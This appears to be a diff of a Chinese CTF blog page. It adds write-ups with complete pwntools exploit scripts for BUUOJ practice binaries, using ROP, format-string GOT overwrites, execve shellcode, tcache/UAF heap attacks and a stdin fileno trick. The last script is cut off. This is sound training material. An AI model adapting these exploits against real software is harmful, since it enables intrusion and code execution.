@@ -121,7 +121,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    2.9k 字
+                    10.7k 字
                   </span>&nbsp;
                 
 
@@ -129,7 +129,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      16 分钟
+                      58 分钟
                   </span>&nbsp;
                 
 
@@ -625,6 +625,1188 @@ payload += asm(shellcraft.write(1,bss,0x30))
 sl(payload)
 
 itr()</code></pre>
+<h2 id="V-amp-N2020-公开赛warmup"><a href="#V-amp-N2020-公开赛warmup" class="headerlink" title="V&amp;N2020 公开赛warmup"></a>V&amp;N2020 公开赛warmup</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>开启了沙盒，使用orw获取flag即可。</p>
+<pre><code>
+Here is my gift: 0x7f411f85c9c0
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011
+ 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011
+ 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010
+ 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count)
+ 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010
+ 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count)
+ 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011
+ 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><p>其中，这题因为只有<code>0x10</code>的溢出空间，猛的一看需要栈迁移，但是会发现不知道往哪里迁移。看了师傅们的博客才知道，由于第一个栈空间较大，且与第二个可以溢出的栈是<strong>紧邻</strong>的。然后，就可以在溢出时覆盖一下返回地址，覆盖为ret，这样就可以多一个ret，从而<strong>接着执行</strong>上一个栈帧buf里面构造的rop链。</p>
+<p>并且在orw中，open函数的第一个参数时一个指针地址(<code>*filename</code>)，所以需要先read一下flag的文件名到一个buf当中，然后再进行orw。</p>
+<p>Buf的寻找：<br>在libc中找一个没有用到的地址段即可。比如<code>__free_hook</code></p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/B3tfJG.png" srcset="/img/loading.gif" alt></p>
+<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./vn_pwn_warmup&#39;
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+remote_libc = local_libc # &#39;./libc.so.6&#39;
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,27585)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+ru(&#39;0x&#39;)
+libc_base = int(r(12),16) - libc.sym[&#39;puts&#39;]
+info_addr(&#39;libc_base&#39;,libc_base)
+pop_rdi = 0x0000000000021102 + libc_base
+pop_rsi = 0x00000000000202e8 + libc_base
+pop_rdx = 0x0000000000001b92 + libc_base
+open = libc_base+libc.sym[&#39;open&#39;]
+read = libc_base+libc.sym[&#39;read&#39;]
+puts = libc_base+libc.sym[&#39;puts&#39;]
+buf = libc_base+libc.sym[&#39;__free_hook&#39;]
+
+payload = flat([
+    pop_rdi,0,pop_rsi,buf,pop_rdx,8,read,
+    pop_rdi,buf,pop_rsi,0,pop_rdx,0,open,
+    pop_rdi,3,pop_rsi,buf,pop_rdx,0x30,read,
+    pop_rdi,buf,puts
+])
+sa(&#39;:&#39;,payload)
+# debug()
+ret = libc_base + 0x0000000000000937
+payload = &#39;a&#39; * 0x78 + p64(ret)
+sa(&#39;?&#39;,payload)
+sleep(1)
+# debug()
+s(&#39;./flag\x00\x00&#39;)
+itr()</code></pre>
+<h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a><code>picoctf_2018_buffer overflow 1</code></h2><p>简单的栈溢出，且存在后门。</p>
+<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./PicoCTF_2018_buffer_overflow_1&#39;
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+remote_libc = local_libc # &#39;./libc.so.6&#39;
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,29988)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+win = 0x080485CB
+offset = 0x28 + 0x4
+payload = &#39;a&#39;*offset + p32(win)
+sa(&#39;:&#39;,payload)
+itr()</code></pre>
+<h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a><code>picoctf_2018_buffer overflow 2</code></h2><p>类似上题，考个控制传参。</p>
+<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./PicoCTF_2018_buffer_overflow_2&#39;
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+remote_libc = local_libc # &#39;./libc.so.6&#39;
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,29988)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+win = 0x80485CB
+offset = 0x6c + 0x4
+payload = &#39;a&#39;*offset + p32(win) + p32(0xDEADBEEF) + p32(0xDEADBEEF) + p32(0xDEADC0DE)
+s(payload)</code></pre>
+<h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p>32位的格式化字符串，考的是单次printf多次写入，因为是32位pwntools的<code>fmtstr_payload</code>是十分好用的。</p>
+<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./axb_2019_fmt32&#39;
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+remote_libc = local_libc # &#39;./libc.so.6&#39;
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,29147)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+printf_got = 0x804A014
+payload = &quot;%9$sA&quot; + p32(0x804A014)
+sla(&#39;me:&#39;,payload)
+ru(&#39;Repeater:&#39;)
+printf_got = uu32(r(4))
+libc_base = printf_got - 0x049020
+info_addr(&#39;libc_base&#39;,libc_base)
+offset = 8
+rce = libc_base + 0x3a80c
+info_addr(&#39;rec&#39;,rce)
+payload = &#39;a&#39; + fmtstr_payload(offset,{0x804A014:rce},write_size = &quot;byte&quot;,numbwritten = 10)
+sla(&#39;me:&#39;,payload)
+itr()</code></pre>
+<h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a><code>pwnable_start</code></h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>32位，无任何保护，作者自己汇编写的程序。<br>分析汇编以后可以认为就是：</p>
+<pre><code class="c">write(1,esp,20)
+read(0,esp,60)</code></pre>
+<p>十分明显的栈溢出，但是难点在shellcode摆上栈以后，如何跳转过去执行。</p>
+<p>利用思路：</p>
+<ul>
+<li>利用控制eip，返回wirte处，泄漏一下栈地址，然后根据偏移算出esp的地址</li>
+<li>摆shellcode上栈，控制好eip</li>
+</ul>
+<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./start&#39;
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+remote_libc = local_libc # &#39;./libc.so.6&#39;
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,27834)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+# debug()
+payload = &#39;a&#39; * 0x14 + p32(0x08048087)
+sa(&quot;:&quot;,payload)
+new_esp = uu32(r(4)) - 4
+addr_shellcode = new_esp + 0x14 + 4
+info_addr(&#39;new esp&#39;,new_esp)
+shellcode  = &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;
+shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;
+shellcode += &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;
+shellcode += &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;
+s(&#39;a&#39; * 0x14 + p32(addr_shellcode) + shellcode)
+itr()</code></pre>
+<p>Shell code 网上一找有很多，找到一个合适字节限制，且可以执行的即可。</p>
+<h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a><code>inndy_rop</code></h2><p>做法跟 <code>cmcc_simplerop</code>基本一样，除了偏移。</p>
+<p>32位下，<code>sys_execve(&quot;sh&quot;, 0, 0, 0)</code> 行不通。（上来测试这个，测试一阵子）</p>
+<h2 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="BJDCTF 2nd secret"></a>BJDCTF 2nd secret</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>慢慢分析可以发现一个溢出点，且利用此处只是可以做到任意地址的数据减1。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/MX0AfS.png" srcset="/img/loading.gif" alt></p>
+<p>然后想到可以在got表处下手，<strong>其中printf、system函数在程序达到一定条件才会运行。所以其got处的值是特定的，并且是相近的。</strong></p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/XkCKMA.png" srcset="/img/loading.gif" alt></p>
+<p>如图所示，相差10。然后利用原来的溢出点，放入printf的got表地址，让其减10次1，也就是答对10次serect后，让程序走向结束处，调用printf。其printf的buf打印的是name，这个是可控的，写成<code>/bin/sh\x00</code>即可。</p>
+<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./secret&#39;
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+remote_libc = local_libc # &#39;./libc.so.6&#39;
+context.log_level = &#39;debug&#39;
+debug = 1
+if debug:
+    io = process(local_file)
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,29635)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+payload = &#39;/bin/sh\x00&#39; + &quot;\x00&quot; * 8 + p64(elf.got[&#39;printf&#39;])[:5]
+#此处payload 因为read那里读的数据大小限制，需要调整一下payload的长度。
+# debug()
+
+sla(&quot;What&#39;s your name?&quot;,payload)
+answer = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63]
+
+for i in range(len(answer)):
+    print(answer[i])
+    sa(&quot;Secret&quot;,str(answer[i]))
+
+sla(&quot;Secret&quot;,&#39;1&#39;)
+itr()</code></pre>
+<h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a><code>ciscn_2019_es_1</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>64位，ubuntu 18.  存在 UAF，十分简单的tcache dup攻击。</p>
+<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./ciscn_2019_es_1&#39;
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+remote_libc = local_libc # &#39;./libc.so.6&#39;
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,29639)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    gdb.attach(io)
+    pause()
+def add(size,name,call):
+    sla(&#39;ice:&#39;,&#39;1&#39;)
+    sla(&#39;size&#39;,str(size))
+    sa(&#39;name&#39;,str(name))
+    sa(&#39;call&#39;,str(call))
+def show(idx):
+    sla(&#39;ice&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+def call(idx):
+    sla(&#39;ice&#39;,&#39;3&#39;)
+    sla(&#39;dex&#39;,str(idx))
+add(0x500,&#39;chumen77&#39;,&#39;chumen77&#39;) #0
+add(0x80,&#39;chumen77&#39;,&#39;chumen77&#39;) #1
+# debug()
+call(0)
+show(0)
+ru(&#39;name:\n&#39;)
+libc_base = uu64(r(6)) - 0x3ebca0
+info_addr(&#39;libc&#39;,libc_base)
+#get libc
+add(0x510-0x20-0x10,&#39;chumen77&#39;,&#39;chumen77&#39;) #2
+add(0x20,&#39;chumen77&#39;,&#39;chumen77&#39;) #3
+call(3)
+call(3)
+free_hook = libc_base + 0x3ed8e8
+add(0x20,p64(free_hook),p64(free_hook)) #4
+add(0x20,p64(free_hook),p64(free_hook)) #5
+rec = rce18[1] + libc_base
+add(0x20,p64(rec),p64(rec))
+call(1)
+itr()</code></pre>
+<h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a><code>ciscn_2019_s_4</code></h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><pre><code class="c">int vul()
+{
+  char s; // [esp+0h] [ebp-28h]
+
+  memset(&amp;s, 0, 0x20u);
+  read(0, &amp;s, 0x30u);
+  printf(&quot;Hello, %s\n&quot;, &amp;s);
+  read(0, &amp;s, 0x30u);
+  return printf(&quot;Hello, %s\n&quot;, &amp;s);
+}</code></pre>
+<ul>
+<li>存在栈溢出，溢出8个字节，考虑栈转移。</li>
+<li>在填充buf， <code>%s</code> 在32位用于泄漏栈上的信息。</li>
+</ul>
+<p>所以可以考虑泄漏处栈地址，libc地址。从而算出buf的base与libc base。</p>
+<p>首先可以明确一点可以覆盖返回地址，第一下考虑直接覆盖为<code>one_gadget</code> 本地通远程不通。</p>
+<p>然后就考虑用栈转移到buf上来获取shell。</p>
+<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./ciscn_s_4&#39;
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+remote_libc = local_libc # &#39;./libc.so.6&#39;
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,26932)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+payload = &#39;a&#39; * (0x28 - 1 ) + &#39;b&#39;
+sa(&#39;name&#39;,payload)
+ru(&quot;b&quot;)
+buf_base = uu32(r(4)) - 0x38
+r(4)
+libc_base = uu32(r(4)) - 0x1fb9b0
+info_addr(&#39;stack&#39;,buf_base)
+info_addr(&#39;libc&#39;,libc_base)
+payload = p32(0x8048450) + p32(elf.plt[&#39;system&#39;]) + p32(0x8048450) + p32(buf_base+16) + &#39;/bin/sh\x00&#39;
+payload = payload.ljust((0x30-4-4-8),&#39;b&#39;) + p32(buf_base) *3+ p32(0x80485FD)
+s(payload)
+itr()</code></pre>
+<h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a><code>ciscn_2019_final_2</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>程序很简单，但是也很细节，由于自己的逆向能力有点差，没有注意部分细节，造成构造堆块，进行leak和改写时，造成较大的困难和迷惑。</p>
+<p>开启了沙盒不能get shell：</p>
+<pre><code>#  line  CODE  JT   JF      K
+# =================================
+#  0000: 0x20 0x00 0x00 0x00000004  A = arch
+#  0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
+#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+#  0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+#  0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
+#  0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
+#  0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+#  0007: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul>
+<li>UAF</li>
+</ul>
+<p>比如：</p>
+<h4 id="程序处："><a href="#程序处：" class="headerlink" title="程序处："></a>程序处：</h4><h5 id="add函数："><a href="#add函数：" class="headerlink" title="add函数："></a>add函数：</h5><pre><code class="c">int *v0; // rbx
+__int16 v1; // ax</code></pre>
+<pre><code class="c"> v0 = (int *)int_pt;
+ *v0 = get_atoi();
+ *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt;</code></pre>
+<pre><code class="c">v1 = get_atoi();
+*(_WORD *)short_pt = v1;
+*((_WORD *)short_pt + 4) = *(_WORD *)short_pt;</code></pre>
+<p>开始对数据类型的大小没有注意，这几处决定着</p>
+<ul>
+<li>int型堆块时，只能写上4字节的数据</li>
+<li>short int 型堆块时，只能写上2字节的数据</li>
+</ul>
+<h5 id="show函数："><a href="#show函数：" class="headerlink" title="show函数："></a>show函数：</h5><pre><code class="c">if ( v2 == 1 &amp;&amp; int_pt )
+    printf(&quot;your int type inode number :%d\n&quot;, *(unsigned int *)int_pt);
+  if ( v2 == 2 &amp;&amp; short_pt )
+    printf(&quot;your short type inode number :%d\n&quot;, (unsigned int)*(signed __int16 *)short_pt);</code></pre>
+<p>意味着leak时也是只能泄漏出部分的字节，增加在利用时的难度，需要利用合适的堆块进行攻击，其合适是指上面有残留合适的数据，然后改末尾几个字节。</p>
+<h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>scanf函数是从stdin中读取数据，且在<code>__IO_2_stdio_</code> 的io结构体存在一个<code>_fileno</code>的标识位，默认值是0，若将其改成其他的文件号，调用scanf函数在获取时，就会获取对应文件。</p>
+<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><ul>
+<li>程序只让你分配0x30或者0x20的堆块，如何伪造出一个至少0x90的堆块，如何释放后，来泄漏libc。</li>
+<li>泄漏出来的数据不是完整的，可写时只能写上2、4字节</li>
+</ul>
+<h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./ciscn_final_2&#39;
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+remote_libc = local_libc # &#39;./libc.so.6&#39;
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,25252)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(type,number):
+    sla(&#39;&gt;&#39;,&#39;1&#39;)
+    sla(&#39;&gt;&#39;,str(type))
+    sla(&quot;:&quot;,str(number))
+
+def free(type):
+    sla(&#39;&gt;&#39;,&#39;2&#39;)
+    sla(&#39;&gt;&#39;,str(type))
+
+def show(type):
+    sla(&#39;&gt;&#39;,&#39;3&#39;)
+    sla(&#39;&gt;&#39;,str(type))
+
+def leave():
+    sla(&#39;&gt;&#39;,&#39;4&#39;)
+    # sa(&#39;?&#39;,str(mes))
+
+
+add(1,1)
+free(1) #leave chunk 0 
+add(2,2)
+add(2,2)
+add(2,2) # 0x90
+#ready to dup
+add(2,2)
+free(2)
+add(1,1) # get chunk0
+free(2)
+#leak heap
+show(2)
+ru(&#39;number :&#39;)
+chunk0_addr_word = int(ru(&#39;\n&#39;)) - 0xa0
+info_addr(&#39;chunk0_addr&#39;,chunk0_addr_word)
+add(2,chunk0_addr_word)
+add(2,chunk0_addr_word)
+add(2,0x91) #fake unsortbin chunk
+#full tache bins
+for i in range(7):
+    free(1)
+    add(2,2)
+#leak libc
+free(1)
+show(1)
+ru(&#39;number :&#39;)
+stdin_fillno = int(ru(&#39;\n&#39;)) - 0x2a0 + 0x70
+info_addr(&#39;stdin_fillno&#39;,stdin_fillno)
+
+#ready to attack stdin_fillno ,use taeche dup
+
+add(1,stdin_fillno)
+add(1,stdin_fillno)
+free(1)
+add(2,stdin_fillno)
+free(1)
+#leak contains libc&#39;s heap
+show(1)
+ru(&#39;number :&#39;)
+chunk1_addr_dword = int(ru(&#39;\n&#39;)) - 0x30
+info_addr(&#39;chunk1_addr_dword&#39;,chunk1_addr_dword)
+#change the 0x30bins chains
+
+add(1,chunk1_addr_dword)
+add(1,chunk1_addr_dword)
+add(1,stdin_fillno)
+#attck the fileno
+add(1,666)
+
+leave()
+itr()</code></pre>
+<p>渣渣英文注释，先不改了。感觉还是挺不容易做的题，堆块如何构造想了老久。到别的师傅那里，归类为简单题。太菜了太菜了，基础还不是很好。</p>
+<h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a><code>pwnable_hacknote</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>简单的uaf</p>
+<h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><pre><code class="c">(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);</code></pre>
+<p>此处在改完<code>ptr[v1]</code>为system以后，其参数的指针是从这个堆块开始的要提前进行截断。</p>
+<pre><code class="c">system(p32(system) + &#39;||sh&#39;)
+system(p32(system) + &#39;;sh;&#39;)</code></pre>
+<h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./hacknote&#39;
+context.log_level = &#39;debug&#39;
+debug = 1
+if debug:
+    io = process(local_file)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,27225)
